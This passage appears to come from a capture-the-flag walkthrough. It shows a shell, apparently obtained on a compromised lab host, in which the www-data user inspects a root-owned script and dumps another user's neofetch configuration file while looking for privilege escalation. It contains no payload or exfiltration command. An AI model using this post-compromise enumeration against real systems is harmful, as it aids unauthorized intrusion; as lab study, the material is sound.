class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meta:/tmp$ <br>www-data@meta:/tmp$ <span class="hljs-built_in">ls</span> -la /usr/local/bin/convert_images.sh<br>-rwxr-xr-x 1 root root 126 Jan  3  2022 /usr/local/bin/convert_images.sh<br>www-data@meta:/tmp$ <span class="hljs-built_in">ls</span> -la /home/thomas/.config/neofetch/config.conf<br>-rw-r--r-- 1 thomas thomas 14591 Aug 30  2021 /home/thomas/.config/neofetch/config.conf<br>www-data@meta:/tmp$ <br><br>www-data@meta:/tmp$ <span class="hljs-built_in">cat</span> /home/thomas/.config/neofetch/config.conf<br><span class="hljs-comment"># See this wiki page for more info:</span><br><span class="hljs-comment"># https://github.com/dylanaraps/neofetch/wiki/Customizing-Info</span><br><span class="hljs-function"><span class="hljs-title">print_info</span></span>() &#123;<br>    info title<br>    info underline<br><br>    info <span class="hljs-string">&quot;OS&quot;</span> distro<br>    info <span class="hljs-string">&quot;Host&quot;</span> model<br>    info <span class="hljs-string">&quot;Kernel&quot;</span> kernel<br>    info <span class="hljs-string">&quot;Uptime&quot;</span> <span class="hljs-built_in">uptime</span><br>    info <span class="hljs-string">&quot;Packages&quot;</span> packages<br>    info <span class="hljs-string">&quot;Shell&quot;</span> shell<br>    info <span class="hljs-string">&quot;Resolution&quot;</span> resolution<br>    info <span class="hljs-string">&quot;DE&quot;</span> de<br>    info <span class="hljs-string">&quot;WM&quot;</span> wm<br>    info <span class="hljs-string">&quot;WM Theme&quot;</span> wm_theme<br>    info <span class="hljs-string">&quot;Theme&quot;</span> theme<br>    info <span class="hljs-string">&quot;Icons&quot;</span> icons<br>    info <span class="hljs-string">&quot;Terminal&quot;</span> term<br>    info <span class="hljs-string">&quot;Terminal Font&quot;</span> term_font<br>    info <span class="hljs-string">&quot;CPU&quot;</span> cpu<br>    info <span class="hljs-string">&quot;GPU&quot;</span> gpu<br>    info <span class="hljs-string">&quot;Memory&quot;</span> memory<br><br>    <span class="hljs-comment"># info &quot;GPU Driver&quot; gpu_driver  # Linux/macOS only</span><br>    <span class="hljs-comment"># info &quot;CPU Usage&quot; cpu_usage</span><br>    <span class="hljs-comment"># info &quot;Disk&quot; disk</span><br>    <span class="hljs-comment"># info &quot;Battery&quot; battery</span><br>    <span class="hljs-comment"># info &quot;Font&quot; font</span><br>    <span class="hljs-comment"># info &quot;Song&quot; song</span><br>    <span class="hljs-comment"># [[ $player ]] &amp;&amp; prin &quot;Music Player&quot; &quot;$player&quot;</span><br>    <span class="hljs-comment"># info &quot;Local IP&quot; local_ip</span><br>    <span class="hljs-comment"># info &quot;Public IP&quot; public_ip</span><br>    <span class="hljs-comment"># info &quot;Users&quot; users</span><br>    <span class="hljs-comment"># info &quot;Locale&quot; locale  # This only works on glibc systems.</span><br><br>    info cols<br>&#125;<br><br><br><span class="hljs-comment"># Kernel</span><br><br><br><span class="hljs-comment"># Shorten the output of the kernel function.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:     --kernel_shorthand</span><br><span class="hljs-comment"># Supports: Everything except *BSDs (except PacBSD and PC-BSD)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;4.8.9-1-ARCH&#x27;</span><br><span class="hljs-comment"># off: &#x27;Linux 4.8.9-1-ARCH&#x27;</span><br>kernel_shorthand=<span class="hljs-string">&quot;on&quot;</span><br><br><br><span class="hljs-comment"># Distro</span><br><br><br><span class="hljs-comment"># Shorten the output of the distro function</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;off&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;on&#x27;, &#x27;off&#x27;, &#x27;tiny&#x27;</span><br><span class="hljs-comment"># Flag:     --distro_shorthand</span><br><span class="hljs-comment"># Supports: Everything except Windows and Haiku</span><br>distro_shorthand=<span class="hljs-string">&quot;off&quot;</span><br><br><span class="hljs-comment"># Show/Hide OS Architecture.</span><br><span class="hljs-comment"># Show &#x27;x86_64&#x27;, &#x27;x86&#x27; and etc in &#x27;Distro:&#x27; output.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --os_arch</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;Arch Linux x86_64&#x27;</span><br><span class="hljs-comment"># off: &#x27;Arch Linux&#x27;</span><br>os_arch=<span class="hljs-string">&quot;on&quot;</span><br><br><br><span class="hljs-comment"># Uptime</span><br><br><br><span class="hljs-comment"># Shorten the output of the uptime function</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;, &#x27;tiny&#x27;</span><br><span class="hljs-comment"># Flag:    --uptime_shorthand</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:   &#x27;2 days, 10 hours, 3 mins&#x27;</span><br><span class="hljs-comment"># off:  &#x27;2 days, 10 hours, 3 minutes&#x27;</span><br><span class="hljs-comment"># tiny: &#x27;2d 10h 3m&#x27;</span><br>uptime_shorthand=<span class="hljs-string">&quot;on&quot;</span><br><br><br><span class="hljs-comment"># Memory</span><br><br><br><span class="hljs-comment"># Show memory pecentage in output.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;off&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --memory_percent</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:   &#x27;1801MiB / 7881MiB (22%)&#x27;</span><br><span class="hljs-comment"># off:  &#x27;1801MiB / 7881MiB&#x27;</span><br>memory_percent=<span class="hljs-string">&quot;off&quot;</span><br><br><br><span class="hljs-comment"># Packages</span><br><br><br><span class="hljs-comment"># Show/Hide Package Manager names.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;tiny&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;tiny&#x27; &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --package_managers</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:   &#x27;998 (pacman), 8 (flatpak), 4 (snap)&#x27;</span><br><span class="hljs-comment"># tiny: &#x27;908 (pacman, flatpak, snap)&#x27;</span><br><span class="hljs-comment"># off:  &#x27;908&#x27;</span><br>package_managers=<span class="hljs-string">&quot;on&quot;</span><br><br><br><span class="hljs-comment"># Shell</span><br><br><br><span class="hljs-comment"># Show the path to $SHELL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;off&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --shell_path</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;/bin/bash&#x27;</span><br><span class="hljs-comment"># off: &#x27;bash&#x27;</span><br>shell_path=<span class="hljs-string">&quot;off&quot;</span><br><br><span class="hljs-comment"># Show $SHELL version</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --shell_version</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;bash 4.4.5&#x27;</span><br><span class="hljs-comment"># off: &#x27;bash&#x27;</span><br>shell_version=<span class="hljs-string">&quot;on&quot;</span><br><br><br><span class="hljs-comment"># CPU</span><br><br><br><span class="hljs-comment"># CPU speed type</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;bios_limit&#x27;</span><br><span class="hljs-comment"># Values: &#x27;scaling_cur_freq&#x27;, &#x27;scaling_min_freq&#x27;, &#x27;scaling_max_freq&#x27;, &#x27;bios_limit&#x27;.</span><br><span class="hljs-comment"># Flag:    --speed_type</span><br><span class="hljs-comment"># Supports: Linux with &#x27;cpufreq&#x27;</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Any file in &#x27;/sys/devices/system/cpu/cpu0/cpufreq&#x27; can be used as a value.</span><br>speed_type=<span class="hljs-string">&quot;bios_limit&quot;</span><br><br><span class="hljs-comment"># CPU speed shorthand</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;off&#x27;</span><br><span class="hljs-comment"># Values: &#x27;on&#x27;, &#x27;off&#x27;.</span><br><span class="hljs-comment"># Flag:    --speed_shorthand</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> This flag is not supported in systems with CPU speed less than 1 GHz</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:    &#x27;i7-6500U (4) @ 3.1GHz&#x27;</span><br><span class="hljs-comment"># off:   &#x27;i7-6500U (4) @ 3.100GHz&#x27;</span><br>speed_shorthand=<span class="hljs-string">&quot;off&quot;</span><br><br><span class="hljs-comment"># Enable/Disable CPU brand in output.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --cpu_brand</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:   &#x27;Intel i7-6500U&#x27;</span><br><span class="hljs-comment"># off:  &#x27;i7-6500U (4)&#x27;</span><br>cpu_brand=<span class="hljs-string">&quot;on&quot;</span><br><br><span class="hljs-comment"># CPU Speed</span><br><span class="hljs-comment"># Hide/Show CPU speed.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --cpu_speed</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;Intel i7-6500U (4) @ 3.1GHz&#x27;</span><br><span class="hljs-comment"># off: &#x27;Intel i7-6500U (4)&#x27;</span><br>cpu_speed=<span class="hljs-string">&quot;on&quot;</span><br><br><span class="hljs-comment"># CPU Cores</span><br><span class="hljs-comment"># Display CPU cores in output</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;logical&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;logical&#x27;, &#x27;physical&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --cpu_cores</span><br><span class="hljs-comment"># Support: &#x27;physical&#x27; doesn&#x27;t work on BSD.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># logical:  &#x27;Intel i7-6500U (4) @ 3.1GHz&#x27; (All virtual cores)</span><br><span class="hljs-comment"># physical: &#x27;Intel i7-6500U (2) @ 3.1GHz&#x27; (All physical cores)</span><br><span class="hljs-comment"># off:      &#x27;Intel i7-6500U @ 3.1GHz&#x27;</span><br>cpu_cores=<span class="hljs-string">&quot;logical&quot;</span><br><br><span class="hljs-comment"># CPU Temperature</span><br><span class="hljs-comment"># Hide/Show CPU temperature.</span><br><span class="hljs-comment"># Note the temperature is added to the regular CPU function.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;off&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;C&#x27;, &#x27;F&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --cpu_temp</span><br><span class="hljs-comment"># Supports: Linux, BSD</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> For FreeBSD and NetBSD-based systems, you&#x27;ll need to enable</span><br><span class="hljs-comment">#       coretemp kernel module. This only supports newer Intel processors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># C:   &#x27;Intel i7-6500U (4) @ 3.1GHz [27.2°C]&#x27;</span><br><span class="hljs-comment"># F:   &#x27;Intel i7-6500U (4) @ 3.1GHz [82.0°F]&#x27;</span><br><span class="hljs-comment"># off: &#x27;Intel i7-6500U (4) @ 3.1GHz&#x27;</span><br>cpu_temp=<span class="hljs-string">&quot;off&quot;</span><br><br><br><span class="hljs-comment"># GPU</span><br><br><br><span class="hljs-comment"># Enable/Disable GPU Brand</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --gpu_brand</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;AMD HD 7950&#x27;</span><br><span class="hljs-comment"># off: &#x27;HD 7950&#x27;</span><br>gpu_brand=<span class="hljs-string">&quot;on&quot;</span><br><br><span class="hljs-comment"># Which GPU to display</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;all&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;all&#x27;, &#x27;dedicated&#x27;, &#x27;integrated&#x27;</span><br><span class="hljs-comment"># Flag:    --gpu_type</span><br><span class="hljs-comment"># Supports: Linux</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># all:</span><br><span class="hljs-comment">#   GPU1: AMD HD 7950</span><br><span class="hljs-comment">#   GPU2: Intel Integrated Graphics</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># dedicated:</span><br><span class="hljs-comment">#   GPU1: AMD HD 7950</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># integrated:</span><br><span class="hljs-comment">#   GPU1: Intel Integrated Graphics</span><br>gpu_type=<span class="hljs-string">&quot;all&quot;</span><br><br><br><span class="hljs-comment"># Resolution</span><br><br><br><span class="hljs-comment"># Display refresh rate next to each monitor</span><br><span class="hljs-comment"># Default: &#x27;off&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --refresh_rate</span><br><span class="hljs-comment"># Supports: Doesn&#x27;t work on Windows.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;1920x1080 @ 60Hz&#x27;</span><br><span class="hljs-comment"># off: &#x27;1920x1080&#x27;</span><br>refresh_rate=<span class="hljs-string">&quot;off&quot;</span><br><br><br><span class="hljs-comment"># Gtk Theme / Icons / Font</span><br><br><br><span class="hljs-comment"># Shorten output of GTK Theme / Icons / Font</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;off&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --gtk_shorthand</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;Numix, Adwaita&#x27;</span><br><span class="hljs-comment"># off: &#x27;Numix [GTK2], Adwaita [GTK3]&#x27;</span><br>gtk_shorthand=<span class="hljs-string">&quot;off&quot;</span><br><br><br><span class="hljs-comment"># Enable/Disable gtk2 Theme / Icons / Font</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --gtk2</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;Numix [GTK2], Adwaita [GTK3]&#x27;</span><br><span class="hljs-comment"># off: &#x27;Adwaita [GTK3]&#x27;</span><br>gtk2=<span class="hljs-string">&quot;on&quot;</span><br><br><span class="hljs-comment"># Enable/Disable gtk3 Theme / Icons / Font</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --gtk3</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;Numix [GTK2], Adwaita [GTK3]&#x27;</span><br><span class="hljs-comment"># off: &#x27;Numix [GTK2]&#x27;</span><br>gtk3=<span class="hljs-string">&quot;on&quot;</span><br><br><br><span class="hljs-comment"># IP Address</span><br><br><br><span class="hljs-comment"># Website to ping for the public IP</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;http://ident.me&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;url&#x27;</span><br><span class="hljs-comment"># Flag:    --ip_host</span><br>public_ip_host=<span class="hljs-string">&quot;http://ident.me&quot;</span><br><br><span class="hljs-comment"># Public IP timeout.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;2&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;int&#x27;</span><br><span class="hljs-comment"># Flag:    --ip_timeout</span><br>public_ip_timeout=2<br><br><br><span class="hljs-comment"># Disk</span><br><br><br><span class="hljs-comment"># Which disks to display.</span><br><span class="hljs-comment"># The values can be any /dev/sdXX, mount point or directory.</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> By default we only show the disk info for &#x27;/&#x27;.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;/&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;/&#x27;, &#x27;/dev/sdXX&#x27;, &#x27;/path/to/drive&#x27;.</span><br><span class="hljs-comment"># Flag:    --disk_show</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># disk_show=(&#x27;/&#x27; &#x27;/dev/sdb1&#x27;):</span><br><span class="hljs-comment">#      &#x27;Disk (/): 74G / 118G (66%)&#x27;</span><br><span class="hljs-comment">#      &#x27;Disk (/mnt/Videos): 823G / 893G (93%)&#x27;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># disk_show=(&#x27;/&#x27;):</span><br><span class="hljs-comment">#      &#x27;Disk (/): 74G / 118G (66%)&#x27;</span><br><span class="hljs-comment">#</span><br>disk_show=(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br><span class="hljs-comment"># Disk subtitle.</span><br><span class="hljs-comment"># What to append to the Disk subtitle.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;mount&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;mount&#x27;, &#x27;name&#x27;, &#x27;dir&#x27;</span><br><span class="hljs-comment"># Flag:    --disk_subtitle</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># name:   &#x27;Disk (/dev/sda1): 74G / 118G (66%)&#x27;</span><br><span class="hljs-comment">#         &#x27;Disk (/dev/sdb2): 74G / 118G (66%)&#x27;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># mount:  &#x27;Disk (/): 74G / 118G (66%)&#x27;</span><br><span class="hljs-comment">#         &#x27;Disk (/mnt/Local Disk): 74G / 118G (66%)&#x27;</span><br><span class="hljs-comment">#         &#x27;Disk (/mnt/Videos): 74G / 118G (66%)&#x27;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># dir:    &#x27;Disk (/): 74G / 118G (66%)&#x27;</span><br><span class="hljs-comment">#         &#x27;Disk (Local Disk): 74G / 118G (66%)&#x27;</span><br><span class="hljs-comment">#         &#x27;Disk (Videos): 74G / 118G (66%)&#x27;</span><br>disk_subtitle=<span class="hljs-string">&quot;mount&quot;</span><br><br><br><span class="hljs-comment"># Song</span><br><br><br><span class="hljs-comment"># Manually specify a music player.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;auto&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;auto&#x27;, &#x27;player-name&#x27;</span><br><span class="hljs-comment"># Flag:    --music_player</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Available values for &#x27;player-name&#x27;:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># amarok</span><br><span class="hljs-comment"># audacious</span><br><span class="hljs-comment"># banshee</span><br><span class="hljs-comment"># bluemindo</span><br><span class="hljs-comment"># clementine</span><br><span class="hljs-comment"># cmus</span><br><span class="hljs-comment"># deadbeef</span><br><span class="hljs-comment"># deepin-music</span><br><span class="hljs-comment"># dragon</span><br><span class="hljs-comment"># elisa</span><br><span class="hljs-comment"># exaile</span><br><span class="hljs-comment"># gnome-music</span><br><span class="hljs-comment"># gmusicbrowser</span><br><span class="hljs-comment"># guayadeque</span><br><span class="hljs-comment"># iTunes</span><br><span class="hljs-comment"># juk</span><br><span class="hljs-comment"># lollypop</span><br><span class="hljs-comment"># mocp</span><br><span class="hljs-comment"># mopidy</span><br><span class="hljs-comment"># mpd</span><br><span class="hljs-comment"># netease-cloud-music</span><br><span class="hljs-comment"># pogo</span><br><span class="hljs-comment"># pragha</span><br><span class="hljs-comment"># qmmp</span><br><span class="hljs-comment"># quodlibet</span><br><span class="hljs-comment"># rhythmbox</span><br><span class="hljs-comment"># sayonara</span><br><span class="hljs-comment"># smplayer</span><br><span class="hljs-comment"># spotify</span><br><span class="hljs-comment"># tomahawk</span><br><span class="hljs-comment"># vlc</span><br><span class="hljs-comment"># xmms2d</span><br><span class="hljs-comment"># yarock</span><br>music_player=<span class="hljs-string">&quot;auto&quot;</span><br><br><span class="hljs-comment"># Format to display song information.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;%artist% - %album% - %title%&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;%artist%&#x27;, &#x27;%album%&#x27;, &#x27;%title%&#x27;</span><br><span class="hljs-comment"># Flag:    --song_format</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># default: &#x27;Song: Jet - Get Born - Sgt Major&#x27;</span><br>song_format=<span class="hljs-string">&quot;%artist% - %album% - %title%&quot;</span><br><br><span class="hljs-comment"># Print the Artist, Album and Title on separate lines</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;off&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --song_shorthand</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># on:  &#x27;Artist: The Fratellis&#x27;</span><br><span class="hljs-comment">#      &#x27;Album: Costello Music&#x27;</span><br><span class="hljs-comment">#      &#x27;Song: Chelsea Dagger&#x27;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># off: &#x27;Song: The Fratellis - Costello Music - Chelsea Dagger&#x27;</span><br>song_shorthand=<span class="hljs-string">&quot;off&quot;</span><br><br><span 